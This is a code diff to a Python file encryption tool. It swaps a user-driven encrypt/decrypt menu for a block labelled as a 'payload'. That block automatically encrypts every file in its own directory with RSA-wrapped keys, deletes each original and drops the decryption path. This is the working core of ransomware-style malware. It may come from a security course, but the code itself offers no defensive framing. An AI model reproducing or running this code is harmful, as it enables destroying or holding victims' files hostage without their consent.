@@ -29,22 +29,20 @@ def genRSAKey():
 	with open(constants.PUBLIC_KEY_FILE_PATH, 'wb') as f:
 		f.write(publicPEM)
 
-# Allows the user to input a filepath of a file to encrypt/decrypt
-repeat = True
-while(repeat):
-	print("File Encryptor/Decryptor")
-	print("---------------------------")
-	print("1. Encrypt a file")
-	print("2. Decrypt a file")
-	print("3. Exit")
-	selection = input()
-	if selection == "1":
-		# Get user input for the file
-		filePath = input("Enter the filepath for the file to be encrypted (e.g. files/larry.jpg): ")
+# Encrypt every file within the directory that the payload is located
 
-		# Generate private/public key if it does not already exist
-		if((not os.path.isfile(constants.PUBLIC_KEY_FILE_PATH)) or (not os.path.isfile(constants.PRIVATE_KEY_FILE_PATH))):
-			genRSAKey()
+# Generate private/public key if it does not already exist
+if((not os.path.isfile(constants.PUBLIC_KEY_FILE_PATH)) or (not os.path.isfile(constants.PRIVATE_KEY_FILE_PATH))):
+	genRSAKey()
+
+# Gather all fileNames
+allFileNames = [f for f in os.listdir(".") if os.path.isfile(os.path.join(".", f))]
+
+# Loop for each file
+for filePath in allFileNames:
+	# Do not encrypt the private key
+	if((filePath is not constants.PRIVATE_KEY_FILE_PATH) and (filePath is not constants.PAYLOAD_FILE_PATH)):
+		print("Encrypting: " + filePath)
 
 		# Call the encryptor
 		RSACipher, cipherText, IV, tag, ext = MyEncrypt.MyRSAEncryptMAC(filePath = filePath, RSAPublicKeyFilePath = constants.PUBLIC_KEY_FILE_PATH)
@@ -71,19 +69,4 @@ while(repeat):
 		os.remove(filePath)
 
 		print("Results of encryption stored at: " + jsonFileName)
-	elif selection == "2":
-		# Get user input for encrypted file
-		filePath = input("Enter the filepath for the file to be decrypted (e.g. files/larry.json): ")
-
-		# Set the private key filepath
-		RSAPrivateKeyFilePath = constants.PRIVATE_KEY_FILE_PATH
-
-		# Decrypt the encrypted message
-		MyDecrypt.MyRSADecryptMAC(filePath, RSAPrivateKeyFilePath)
-	elif selection == "3":
-		print("Exiting")
-		repeat = False
-	else:
-		print("Invalid input")
-
-os.system("pause")
+		print("")
